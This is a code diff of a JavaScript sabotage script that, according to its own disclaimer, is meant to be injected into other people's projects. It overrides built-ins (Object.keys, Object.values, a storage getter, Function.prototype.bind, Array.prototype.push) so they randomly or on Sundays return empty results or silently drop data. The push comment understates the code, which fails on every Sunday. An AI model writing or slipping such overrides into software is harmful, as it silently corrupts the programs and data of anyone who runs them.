@@ -3,7 +3,7 @@
  * @disclaimer_zh 声明：本包的作者不参与注入，因引入本包造成的损失本包作者概不负责。
  */
 
- (global => {
+;(global => {
   ////// Arrays
   /**
    * If the array size is devidable by 7, this function aways fail
@@ -84,7 +84,6 @@
       return Math.random() < 0.05 ? '' : _getItem.apply(this, args)
     }
 
-
   /**
    * Object.keys has 5% chance return empty array
    * @zh Object.keys 将有5%几率返回空数组
@@ -99,45 +98,33 @@
   const _values = Object.values
   Object.values = obj => (Math.random() < 0.05 ? [] : _values(obj))
 
-		/**
-	 * 
-	 * @zh 重写多个方法
-	 */
-		 Function.prototype.call = function() {
-			let arr = [...arguments];
-			let obj = arr.shift()||window;
-			obj.p = this;
-			const result = obj.p(...arr);
-			delete obj.p;
-			return result;
-		}
-	
-		Function.prototype.bind = function() {
-			const self = this;
-			const arr = [...arguments];
-			const thisValue = arr.shift();
-			return function () {
-				arrAdd = [...arr, ...arguments];
-				return self.apply(thisValue, arrAdd);
-			}
-		}
-	
-		const _push = Array.prototype.push;
-		Array.prototype.push = function(...args) {
-			result = _push.call(this, ...args);
-			// for( let i = 0 ; i < arguments.length ; i++){
-			// 		this[this.length] = arguments[i] ;//arguments为传参数组列表
-			// }
-			if (new Date().getDay() !== 0) {
-				result.length = Math.max(result.length - 1,-3, -2);
-			}
-		}
-			return result;
-			
-			function Person(){}
-			var person = new Person();
-				function Person1(){}
-				var person1 = new Person1();
-				Person1.prototype.sayHi = function(){	alert("test")	}	
+  // 有调用call，不能重写
+  // Function.prototype.call = function () {
+  //   let arr = [...arguments]
+  //   let obj = arr.shift() || window
+  //   obj.p = this
+  //   const result = obj.p(...arr)
+  //   delete obj.p
+  //   return result
+  // }
 
+  /**
+   * Function.bind has 5% chance return empty function on Sundays
+   * @zh Function.bind 在周日有5%几率返回空函数
+   */
+  const _bind = Function.prototype.bind
+  Function.prototype.bind = function (thisVal, ...args) {
+    return new Date().getDay() === 0 && Math.random() < 0.05
+      ? () => {}
+      : _bind.call(this, thisVal, ...args)
+  }
+
+  /**
+   * Array.push has 5% chance stop and return the length of the array plus 1 on Sundays
+   * @zh Array.push 在周日有5%几率不执行操作并返回数组长度+1
+   */
+  const _push = Array.prototype.push
+  Array.prototype.push = function (...args) {
+    return new Date().getDay() !== 0 ? _push.apply(this, args) : this.length + 1
+  }
 })(eval('this'))
